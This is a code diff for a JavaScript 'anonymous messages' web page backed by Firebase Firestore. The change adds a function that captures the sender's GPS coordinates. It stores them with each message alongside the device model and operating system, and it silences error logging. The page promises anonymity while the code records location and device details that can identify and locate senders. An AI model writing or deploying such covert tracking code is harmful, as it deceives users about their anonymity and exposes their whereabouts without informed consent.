@@ -1,7 +1,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-// NUEVA CONFIGURACIÓN PARA: mensajes-anonimos-bryan
 const firebaseConfig = {
   apiKey: "AIzaSyA-3Igz0KeLHk0nZ3qYe9_xru9axWaKm4U",
   authDomain: "mensajes-anonimos-bryan.firebaseapp.com",
@@ -14,6 +13,21 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
+// Función para obtener coordenadas
+function getCoords() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve("No soportado");
+    } else {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+        () => resolve("Permiso denegado"),
+        { timeout: 10000 }
+      );
+    }
+  });
+}
+
 async function getDetailedDeviceInfo() {
   const ua = navigator.userAgent;
   let model = "No detectado";
@@ -24,9 +38,7 @@ async function getDetailedDeviceInfo() {
       model = hints.model || "";
       platformInfo = `${navigator.userAgentData.platform} ${hints.platformVersion || ""}`;
     }
-  } catch (e) {
-    console.error("Error en dispositivo:", e);
-  }
+  } catch (e) {}
   if (!model || model === "No detectado") {
     if (/iphone|ipad|ipod/i.test(ua)) { model = "iPhone/iPad"; platformInfo = "iOS"; }
     else if (/android/i.test(ua)) { model = "Android"; platformInfo = "Android"; }
@@ -49,12 +61,16 @@ form.addEventListener('submit', async (e) => {
 
   try {
     const info = await getDetailedDeviceInfo();
+    const ubicacion = await getCoords(); // Captura la ubicación aquí
+
     await addDoc(collection(db, "mensajes"), {
       mensaje: messageInput.value,
       dispositivo: info.modelo_exacto,
       sistema: info.sistema,
+      ubicacion: ubicacion, // Se guarda en la base de datos
       timestamp: serverTimestamp()
     });
+
     messageInput.value = "";
     btn.innerText = "¡Enviado!";
     setTimeout(() => {
@@ -62,7 +78,7 @@ form.addEventListener('submit', async (e) => {
       btn.innerText = "¡Enviar mensaje!";
     }, 2500);
   } catch (error) {
-    console.error("Error Firebase:", error);
+    console.error("Error:", error);
     btn.innerText = "Error";
     btn.disabled = false;
   }
